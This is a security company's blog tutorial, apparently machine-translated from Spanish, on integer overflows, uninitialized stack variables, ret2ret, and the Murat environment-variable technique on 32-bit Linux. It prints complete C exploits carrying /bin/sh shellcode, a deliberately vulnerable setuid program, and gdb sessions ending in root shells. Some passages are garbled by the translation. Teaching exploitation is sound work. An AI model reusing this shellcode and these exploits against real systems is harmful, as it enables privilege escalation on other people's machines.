---
layout: blog-detail
comments: true
title: "Complementary Method : The Byte at the End of the Universe Stack"
date: 2018-07-24T14:47:00+00:00
categories:
    - Exploiting
tags:
    - 32 bit
    - buffer overflow
    - environment variable
    - integer overflow
    - murat
    - ret2ret
    - shellcode
    - x86
image_src: /assets/uploads/2018/07/Shellcodes-el-codigo-de-la-exploiting-puffin-security.jpg
image_height: 1280
image_width: 1920
author: Yago Gutierrez
description: Very good, this post is dedicated to a couple of, I think &#8220;techniques&#8221; might call, which can be interesting. The first is really important. This is the integer overflow. Methods 0x9c90928f939a929a918b9e8d96908c First let&#8217;s take a look at how the numeric values ​​are stored in memory....
publish_time: 2018-07-24T14:47:00+00:00
modified_time: 2019-11-13T08:26:20+00:00
comments_value: 0
---
Very good, this post is dedicated to a couple of, I think “techniques” might call, which can be interesting. The first is really important. This is the [**_integer overflow_**](http://phrack.org/issues/60/10.html).

#### Methods 0x9c90928f939a929a918b9e8d96908c

First let’s take a look at how the numeric values ​​are stored in memory. There are two essential types to store values: `int` and `char`, being the `int` of at least 16 bits, although in x86 and x86\_64 always be 32 bits (the most common) or 64-bit (x86\_64 alone, but little common). Moreover, `char` must always be 8 bits, although theoretically its size is defined in the header `<limits.h>`, by `CHAR_BIT` macro because computers formerly used a 7-bit `char`, because regular ASCII (regular ASCII is the ASCII what the Old Testament in the Bible, Koran, etc.) is only 128 values ​​(`127 = 01111111b`, 7 bits), then added the extended ASCII, with 128 more values, being necessary to increase the `char` size of 8 bits. Nowadays it is impossible to find a machine that uses a 7-bit `char`.

Let’s see how a negative value is represented. At first the complement was used to 1, that is, if we represent binary 1 as follows (as 8bit value): 00000001b (the ‘b’ end indicates that it is in binary) -1 would 11111110b, ie its complementary. 117 is in binary 01110101b, so the -117 would be 10001010b. However, this would imply the existence of a 0 (00000000b) and a -0 (11111111b), when this difference is not real, so to make good use of all the space of possibilities, the plug 2 is used, which is calculated adding 1 to the complement to 1. that is, the -1 would be the complement to 1 00000001b more 1 which is `11111110b + 1 = 11111111b`. The -117 would now be 10001011b.

I note how the first bit somehow acts as a sign, so in such variables `signed` the first bit to see if it is positive or negative (1 for negative and 0 for positive) is used. Therefore, in variables as `signed int` (for 32-bit `int`) is the range from (-231) to (+ 231-1), ie from -2147483648 to +2147483647 (using the 1’s complement would range from -2147483647 to +2147483647), while an `unsigned int` (32 bits) ranges from 0 to 232, that is, from 0 to 4294967296. It can be seen that the amount of numbers representable with an `unsigned` is equal to the number of representable numbers with `signed`, although the maximum absolute value of a `signed` half is unsigned because one bit is used to indicate the sign and only 31 bits to indicate the value. Finally indicate that by default, in C, all variables are `signed`.

Now, is very common that a programmer use variables without indicating which are `unsigned` for testing of size (a size should not to be negative) and then use that same variable in other functions, being able to produce an _buffer underflow_, or, most commonly, a _buffer overflow_. An example

    #include <stdio.h>
    #include <stdlib.h>

int main(int argc, char\*\* argv)  
{  
signed int len, read;  
char buf\[256\];

if(argc < 2) return 1;

len = atoi(argv\[1\]);  
printf(“Size received: %dn”, len);

// if(len >= sizeof(buf))  
if(len >= 256)  
{  
printf(“%u >= 256n”, len);  
printf(“Maximum reading: 256n”);  
leidos = fread(buf, sizeof(char), sizeof(buf), stdin);  
}  
else  
{  
printf(“%u < 256n”, len);  
printf(“Maximum reading: signed:%dtunsigned:%1$un”);  
leidos = fread(buf, sizeof(char), len, stdin);  
}

printf(“Read: %dn”, read);

return 0;  
}

a buffer of 256 bytes which are read from the stdin is declared. The user tells the program the length of the data to read in the buffer using a numeric argument. Before copying it is checked whether the value provided by the user is greater than 256, then 256 bytes are read, if the amount indicated by the user is less than 256, will read exactly that amount.

The problem lies in the `if`, since the `len` variable is `signed`, so the user can enter a negative value as `-1`. This will make will check in `if` `-1 >= 256`, that being false to drive you run the `else`, where the number of bytes provided by the user is read. Is the `nmiemb` `fread()` parameter is `size_t` (in the library is defined by a `typedef` as `unsigned int`), so a cast to unsigned buffer is made, being an argument 4294967295, may thus overflow. Let’s see it.

    $ perl -e 'print "A"x10' | ./b 10
    Size received: 10
    10 < 256
    Maximum reading: signed:10    unsigned:10
    Read: 10

$ perl -e ‘print “A”x1000’ | ./b 10  
Size received: 10  
10 < 256  
Maximum reading: signed:10 unsigned:10  
Read: 10

$ perl -e ‘print “A”x3’ | ./b 10  
Size received: 10  
10 < 256  
Maximum reading: signed:10 unsigned:10  
Read: 3

arget@plata:~$ perl -e ‘print “A”x3’ | ./b 300  
Size received: 300  
300 >= 256  
Maximum reading: 256  
Read: 3

$ perl -e ‘print “A”x290’ | ./b 300  
Size received: 300  
300 >= 256  
Maximum reading: 256  
Read: 256

$ perl -e ‘print “A”x256’ | ./b 300  
Size received: 300  
300 >= 256  
Maximum reading: 256  
Read: 256

$ perl -e ‘print “A”x257’ | ./b 300  
Size received: 300  
300 >= 256  
Maximum reading: 256  
Read: 256

$ perl -e ‘print “A”x257’ | ./b 256  
Size received: 256  
256 >= 256  
Maximum reading: 256  
Read: 256

At first there seems to be no logical error. Let’s make magic once again

    $ perl -e 'print "A"x1000' | ./b -1
    Size received: -1
    4294967295 < 256
    Maximum reading: signed:-1    unsigned:4294967295
    Read: 1000
    Segmentation fault

Well this is easy. It is already evident the method of exploitation.

Oh by the way

    #include <stdio.h>
    #include <stdint.h>
    #include <string.h>

int main(argc, argv)  
int argc;  
uint8\_t\*\* argv;  
{  
uint32\_t i, l;

if(argc < 2) return 1;

l = strlen(argv\[1\]);  
for(i = 0; i < l; i++)  
argv\[1\]\[i\] = ~argv\[1\]\[i\];

printf(“0x”);  
for(i = 0; i < l; i++)  
printf(“%02x”, argv\[1\]\[i\]);  
putchar(‘n’);

return 0;  
}

Let’s see who catches no sense now…

0x8b90918b90df9a93df8e8a9adf9390df939a9e title hahahah I had to, I’m sorry.

Let’s keep going. Another type of integer overflow: Given that there is limited space when that space is exceeded, the excess bits that are truncated. If a variable `char` (8-bit) contains the value 255 (0xff, 11111111b), and adds one, the result should be 0x0100 (100000000b), a score of 9 bits, then saved at the end in the variable result is 0x00.

The following code:

    #include <stdio.h>

int main()  
{  
char c;  
c = 255;  
printf(“%hhun”, c);  
c++;  
printf(“%hhun”, c);

return 0;  
}

Da como resultado

$ ./c
255
0

Let’s see an example of integer overflow in real life. A vulnerability discovered in 2016 (CVE-2016-9066) affected Thunderbird <45.5, Firefox ESR <45.5, and Firefox <50 ([bug: 1299686](https://bugzilla.mozilla.org/show_bug.cgi?id=1299686)). Observe the following code:

nsresult
nsScriptLoadHandler::TryDecodeRawData(const uint8\_t\* aData,
                                      uint32\_t aDataLength,
                                      bool aEndOfStream)
{
  int32\_t srcLen = aDataLength;
  const char\* src = reinterpret\_cast<const char \*>(aData);
  int32\_t dstLen;
  nsresult rv =
    mDecoder->GetMaxLength(src, srcLen, &dstLen);

NS\_ENSURE\_SUCCESS(rv, rv);

uint32\_t haveRead = mBuffer.length();  
uint32\_t capacity = haveRead + dstLen; // \[\[ 1 \]\]  
if (!mBuffer.reserve(capacity)) {  
return NS\_ERROR\_OUT\_OF\_MEMORY;  
}

rv = mDecoder->Convert(src,  
&srcLen,  
mBuffer.begin() + haveRead,  
&dstLen);

NS\_ENSURE\_SUCCESS(rv, rv);

haveRead += dstLen;  
MOZ\_ASSERT(haveRead <= capacity, “mDecoder produced more data than expected”);  
MOZ\_ALWAYS\_TRUE(mBuffer.resizeUninitialized(haveRead));

return NS\_OK;  
}

Broadly what the role is to get the size of the data for the last time the server received and in the line marked with `[[ 1 ]]`, a new capability for `mBuffer` is calculated for reassigning a new size by the method `mBuffer.reserve()`.

The vulnerability is exploited if the server sends more than 4GB of data (although they can be compressed to the net only circulate, according to the PoC published, 18MB), as it will produce an integer overflow in `capacity`. If `capacity` acquires less than the previous length of `mBuffer` value, the size of `mBuffer` not be modified. Consequently, `mDecoder()` end up writing beyond the end of the buffer. It is a very good example of how an integer overflow can trigger a buffer overflow, in this case in the heap.

Another serious problem that is committed with relative frequency is the use of **uninitialized variables**. Something like the following code can easily occur:

    #include <stdio.h>

int main()  
{  
int i;  
while(i < 100)  
printf(“%dn”, i++);  
return 0;  
}

In this case it will not happen anything serious, because the stack is clean even when main() is executed, and it will behave just as if `i` had been initialized to 0. But in the following example (rather surreal) we see what can happen.

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void f2(void)  
{  
int c;  
if(c == 0xdeadbeef)  
{  
setuid(0);  
system(“/bin/sh”);  
}  
}

void f1(int b)  
{  
int a = b;  
}

int main(int argc, char\*\* argv)  
{  
if(argc < 2) return 1;  
f1(atoi(argv\[1\]));  
f2();  
return 0;  
}

At first it seems impossible that inside the `if`run on`f2()`. But it’s not like that:

$ gcc a.c -o a

$ sudo chown root:root a

$ sudo chmod u+s a

$ ./a 1

$ ./a 2

$ ./a 1000

$ ./a 10000000

$ ./a 3735928559  
\# whoami  
root  
#

What kind of magic is this?

First keep in mind that is in hex `3735928559` `0xdeadbeef`.

What happens is that the `f2()` function will occupy exactly the same stack frame that`f1()`, leaving the variable `c` of `f2()` in exactly the same place where was the variable `a` of  `f1()`. Not being initialized in `f2()`, `c`will maintain the value contained in `a` during the execution of f`f1()`.

This type of error is particularly difficult to detect when the variable that is used uninitialized has gone to another as a pointer.

It’s really interesting to exploit these vulnerabilities, especially when frames stack do not match such a clear way, because we have to study how changing the values ​​of the above functions can locate the variable that you are interested in the right vulnerable function value.

Let us now with a technique that is rarely discussed by the specific conditions required, but I think it might useful at times.

**_ret2ret:_** When you wake up lazy.

This technique only applies to functions that are passed as an argument a pointer to our fruit (and we can put at the beginning thereof a shellcode or instruction that allows us to reach it, for example, in an HTTP request us it would be impossible, since they must start with the method used, either `GET`, `POST`, `HEAD` … unless then the body of the request is passed to a function that is the one that contains the vulnerability, of course). Oh, and another condition is that the calling convention is cdecl, since it is necessary that the arguments are passed by the stack.

It works because of how the stack just left after making a call and just prior to the end of `ret` _callee_ function (_caller_ for the caller and _callee_ for the call). That is, so

+--------------------+
|        arg1        | <- &shellcode
+--------------------+
|       EIP(s)       | <- &ret
+--------------------+

By placing in`EIP(s)` an address to a `ret`, this direction will be taken when the end of the function, when our `ret` run will be collected in EIP the argument passed to the function are exploiting, that as I said, you must be an address to our fruit. It is clearly a form of bypassear ASLR, but it is only useful if you already have executed permissions on the area of ​​your shellcode.

Finally, and add more as this other technique I think is rather skippable, but knowledge does not take place, or so they say … Sherlock Holmes said the opposite … on knowing that the earth revolves around Sun … or really was Doyle who said it through the character? … This is the technique … technique Murat.

_****_Murat Technique_**: The byte at the End of the Universe stack**, the byte of Higgs_

What a good caption, I think I’ll put in the main title … The Murat technique (or so christened blackngel) is useful in privesc as it is to run the program operated with almost zero setting, a single environment variable, which contains the shellcode. We can see the PoC that uses blackngel in its [SET article](http://www.set-ezine.org/index.php?num=37&art=6) (The article refers to Buffer Overflows Demystified, Murat, although that page no longer exists, but the info at the time ran online \[_rushing through the phone line_\] _like heroin through an addict’s veins_, so it was easy to find in [other site](http://www.enderunix.org/docs/en/bof-eng.txt)).

    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>

#define BSIZE 144  
#define NAME “./murat”

char shellcode\[\] =  
“x31xc0x31xdbxb0x17xcdx80”  
“xebx1fx5ex89x76x08x31xc0x88x46x07x89x46”  
“x0cxb0x0bx89xf3x8dx4ex08x8dx56x0cxcdx80”  
“x31xdbx89xd8x40xcdx80xe8xdcxffxffxff/bin/sh”;

void main(int argc, char \*argv\[\]) {

char \*p;  
char \*env\[\] = {shellcode, NULL};  
char \*vuln\[\] = {NAME, p, NULL};  
int \*ptr, addr;  
int size;  
int i;

size = BSIZE;

p = (char \*) malloc(size \* sizeof(char));  
if(p == NULL) {  
fprintf(stderr, “nInsufficient memoryn”);  
exit(0);  
}

addr = 0xbffffffa – strlen(shellcode) – strlen(NAME) – 1;  
printf(“Using Address: \[ %08x \]n”, addr);

ptr = (int \*)p;  
for (i = 0; i < BSIZE; i += 4)  
\*(ptr++) = addr;

execle(vuln\[0\], vuln, p, NULL, env);  
}

And it is designed to exploit the following code

#include <stdio.h>
#include <string.h>

int main(int argc, char \*argv\[\])  
{  
char buff\[10\];  
strcpy(buff, argv\[1\]);  
return 0;  
}

The principle used in the exploit to calculate the address of the shellcode on the stack is based on how the stack is organized. At the _start of the stack_ (another good title), which was once 0xbfffffff simply found a 0x00000000 indicator that is beyond the end of the world, a sign for unwary sailors who dared to exceed Finisterre … ahem, I’m going . Before (or after) the `NULL` find the program name (not `argv[0]`), and the environment.

For variables that the method used to determine the address of the shellcode (introduced into an environment variable) is subtracted from 0xbfffffff first 4 bytes (those of the `NULL`), then subtract the length of the program name (that is terminated with a null byte, hence the `-1` at the end of the sentence), and finally,

Today, the top of the stack is in 0xffffe000, the last byte the 0xffffdfff legible. And it ends with two `NULL` (instead of one), so the exploit will have to modify it a little.

**First, I must clarify that this applies only to a system without ASLR. This technique is today rather a curiosity, unless you get off ASLR first for some misconfiguration, this technique is not applicable today. Nor should we forget that today the stack is not executable, then this technique can be used in conjunction with others that we first give execute permissions, as ROP.**

We will exploit our provided program (because the current gcc converts the stack of main() in a swamp), although with a smaller buffer to make it similar to our friend:

    #include <stdio.h>
    #include <string.h>

void print(char\* arg)  
{  
char buffer\[10\];  
strcpy(buffer, arg);  
}

int main(int argc, char\*\* argv)  
{  
print(argv\[1\]);  
return 0;  
}

And the exploit:

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

#define FILLING 22  
#define PATH  “./vuln”

char shellcode\[\] =  
“x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50”  
“x53x89xe1x31xd2xb0x0bxcdx80”;

void panic(char\* s)  
{  
perror(s);  
exit(-1);  
}

int main(int argc, char\*\* argv)  
{  
char arg\[FILLING + sizeof(void\*)\];  
char\* env\[\] = {shellcode, NULL};  
uint32\_t\* addr;  
int i;

for(i = 0; i < FILLING; i++)  
arg\[i\] = ‘A’;

addr = (int\*)(arg + FILLING);  
\*addr = 0xffffe000 – 4 \* 2 – (strlen(PATH) + 1) – (strlen(shellcode) + 1);  
printf(“Usando direccion: \[ %p \]n”, \*addr);

printf(“Payload: “);  
for(i = 0; i < FILLING + 4; i++)  
printf(“%02x”, (unsigned char) arg\[i\]);  
putchar(‘n’);

execle(PATH, PATH, arg, NULL, env);  
panic(“Error en execle()”);  
}

Apart from the differences in style (and I’ve used a somewhat better shellcode) it is shown on line

\*addr = 0xffffe000 - 4 \* 2 - (strlen(PATH) + 1) - (strlen(shellcode) + 1);

Differences when calculating the address of the shellcode. The most obvious is that before the stack starting in 0xbfffffff, now in 0xffffe000. Another important thing is that, as we have said, once at the top of one stack was `0x00000000`, now there are two, there appear instead of a simple `-4`, display a `-4*2`, to subtract 8 bytes add the two `0x00000000`. This is subtracted from the length of the program name and length of the shellcode. It is particularly funny how blackngel indicates that this must be normally add an “extra” byte, without explanation. That “extra” byte must always subtract, as it is the byte string ending the program name. Equally, I cannot explain another “extra” byte to be subtracted which is the ending environment variable with our shellcode is not mentioned, because although it is a binary value, not a chain (consists of characters printable) in the exploit what we have defined as a string (found in quotation marks), and if we define it as an array of char s and not end up with a null byte, when placing execve() (called by execle()) environment variables on the stack of the new process will not know when to stop reading, reading (and writing each byte read in the stack of the new process) until a null byte, as it expects each environment variable is a chain. Then the null byte **must** exist.

If someone wishes to test on the latter, you must define the `shellcode` array within a function, because if it is declared as global, will be located in the `.data` section, which, almost certainly, will be placed at the end of this section. Each section is terminated by at least one 0x00000000, so we find that our shellcode has been terminated by a null byte and we cannot experience the need to define environment variables as strings.

    int main()
    {
        char shellcode[] = {0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68,
                            0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50,
                            0x53, 0x89, 0xe1, 0x31, 0xd2, 0xb0, 0x0b, 0xcd,
                            0x80};
        [...]
    }

Once this is done you can proceed to examine the process stack victim:

$ gdb -q ./vuln
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) set exec-wrapper ./x
(gdb) br \*imprimir +26
Breakpoint 1 at 0x8048425
(gdb) run
Starting program: /home/arget/vuln 
Usando direccion: \[ 0xffffdfd8 \]
Payload: 41414141414141414141414141414141414141414141d8dfffff

Breakpoint 1, 0x08048425 in print ()  
(gdb) display /i $pc  
1: x/i $pc  
\=> 0x8048425 <print+26>: ret  
(gdb) nexti  
0xffffdfd8 in ?? ()  
1: x/i $pc  
\=> 0xffffdfd8: jae 0xffffe042  
(gdb) x $eip  
0xffffdfd8: 0x2f686873  
(gdb)  
0xffffdfdc: 0x896e6962  
(gdb)  
0xffffdfe0: 0x895350e3  
(gdb)  
0xffffdfe4: 0xb0d231e1  
(gdb)  
0xffffdfe8: 0x2b80cd0b  
(gdb)  
0xffffdfec: 0x1affffd3  
(gdb)  
0xffffdff0: 0x762f2e00  
(gdb)  
0xffffdff4: 0x006e6c75  
(gdb)  
0xffffdff8: 0x00000000  
(gdb)  
0xffffdffc: 0x00000000  
(gdb)  
0xffffe000: Cannot access memory at address 0xffffe000 // it’s the end of the world, of course (called _kernel land_)  
(gdb) x/s 0xffffdff0+1  
0xffffdff1: “./vuln”

We just after the `cd 80` (opcodes for `int 0x80`) end of our shellcode, a series of data, specifically see the following bytes (in hex, of course):`2b d3 ff ff 1a 00`, and then the string “. / vuln “. These data, given that this is little endian (friend), are one direction and the other half, namely `0xffffd32b` and `0x????001a` (the second, I guess it’s a direction as it must be in the stack function `print()`, and that there is no string containing `0x1a`, which is also not printable, then hopefully be the end of an address). These two addresses correspond to the stack of the exploit. Let this serve as an introduction to the memory leaks. Filtered by the type of address, the exploit was compiled as 32 bits, simply the custom led me to compile it with the `-m32` option, but we can see that the error occurs the same if it is compiled for 64 bits.

    $ gdb -q vuln
    Reading symbols from vuln...(no debugging symbols found)...done.
    (gdb) br *print +26
    Breakpoint 1 at 0x8048425
    (gdb) set exec-wrapper ./x
    (gdb) run
    Starting program: /home/arget/vuln 
    Using Address: [ 0xffffdfd8 ]
    Payload: 41414141414141414141414141414141414141414141d8dfffff

Breakpoint 1, 0x08048425 in print ()  
(gdb) display /i $pc  
1: x/i $pc  
\=> 0x8048425 <print+26>: ret  
(gdb) nexti  
0xffffdfd8 in ?? ()  
1: x/i $pc  
\=> 0xffffdfd8: jae 0xffffe042  
(gdb) x $eip  
0xffffdfd8: 0x2f686873  
(gdb)  
0xffffdfdc: 0x896e6962  
(gdb)  
0xffffdfe0: 0x895350e3  
(gdb)  
0xffffdfe4: 0xb0d231e1  
(gdb)  
0xffffdfe8: 0x4680cd0b  
(gdb)  
0xffffdfec: 0x55555555  
(gdb)  
0xffffdff0: 0x762f2e00  
(gdb)  
0xffffdff4: 0x006e6c75  
(gdb)  
0xffffdff8: 0x00000000  
(gdb)  
0xffffdffc: 0x00000000  
(gdb)  
0xffffe000: Cannot access memory at address 0xffffe000 // Dragons and monsters from hell

They are now `46 55 55 55 55 00` after the shellcode. Given that the stack address of a 64-bit process (without ASLR) are of the form `0x55555555????` check that there is a partial address. The null byte _memory leak_ stopped what corresponds as it was just before the address has been leaked. The address to which also lacks a byte, as it has been overwritten by our shellcode, surely there is a residual address that was on the stack, left there by a previous function.

Anyway, once it demonstrated why it is necessary to subtract one direction due to the terminator byte of the program name, and subtract another byte, because the byte terminator environment variable, proceed to demonstrate the _correct_ PoC.

    $ gcc x.c -o x
    $ ./x
    Using Address: [ 0xffffdfd7 ]
    Payload: 41414141414141414141414141414141414141414141d7dfffff
    # whoami
    root
    # 

The truth is more elegant to use an exploit in a “program/script” that through a _one-line_ command, but _I am myself and my hobbies_ … \[_and if not save it, not unless I_\] – Ortega y Gasset? Who are they?

And here ended a full-fledged _post_ of references (meh really are not many), finally, today I felt like this.

Good afternoon, the byte may accompany you.

At Puffin Security, we use the ELITE SECURITY TESTING CONSULTING methodology so you can rest assured that your organization will have the highest level of security. 

Complete the form, and we'll be in touch as soon as possible

[![Lets Audit Button](/assets/uploads/2023/01/Puffin-security-blog-button-lest-audit-2.jpg 'lets Audit Button')](https://hub.puffinsecurity.com/quote)
